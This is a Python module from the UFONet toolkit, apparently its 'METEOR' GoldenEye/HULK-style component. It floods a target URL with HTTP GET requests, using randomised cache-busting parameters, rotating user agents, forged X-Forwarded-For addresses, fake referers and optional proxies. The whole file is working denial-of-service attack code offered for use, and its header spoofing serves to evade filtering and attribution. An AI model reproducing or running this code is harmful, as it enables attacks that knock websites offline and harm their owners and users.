#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, string, time
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    from core._ensure import ensure
    if ensure('requests') is None or ensure('urllib3') is None:
        print("\nError importing: requests lib.\n")
        sys.exit(2)
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# UFONet GoldenEye / HULK style (METEOR) - HTTP flood with cache-busting unique URIs

def _rand(n):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def meteorize(self, target, rounds, proxy):
    n=0
    proxyD = {"http": proxy, "https": proxy}
    try:
        for i in range(int(rounds)):
            n += 1
            self.user_agent = random.choice(self.agents).strip()
            params = {
                _rand(6): _rand(8),
                _rand(6): _rand(8),
                '_': str(random.randint(1, 10**12)),
                'rnd': _rand(12),
            }
            headers = {
                'User-Agent': str(self.user_agent),
                'Accept': '*/*',
                'Cache-Control': 'no-cache, max-age=0',
                'Pragma': 'no-cache',
                'X-Forwarded-For': '.'.join(str(random.randint(1,254)) for _ in range(4)),
                'Referer': 'https://www.google.com/?q=' + _rand(8),
            }
            try:
                requests.get(target, params=params, headers=headers, proxies=proxyD, verify=False, timeout=8)
                print("[Info] [AI] [METEOR] Strike ["+str(n)+"] -> [HIT!]")
            except Exception:
                print("[Error] [AI] [METEOR] Failed strike ["+str(n)+"]")
    except:
        print("[Error] [AI] [METEOR] Failing to engage... -> Is still target online? -> [Checking!]")

class GOLDENEYE(object):
    def __init__(self):
        self.agents_file = 'core/txt/user-agents.txt'
        self.agents = []
        try:
            with open(self.agents_file) as f:
                for a in f.readlines():
                    self.agents.append(a)
        except Exception:
            self.agents = ['Mozilla/5.0 (UFONet-METEOR)']
        self.user_agent = self.agents[0]

    def attacking(self, target, rounds, proxy=None):
        print("[Info] [AI] HTTP cache-bust flood (METEOR) is ready to fire: [", rounds, "strikes ]")
        meteorize(self, target, rounds, proxy)
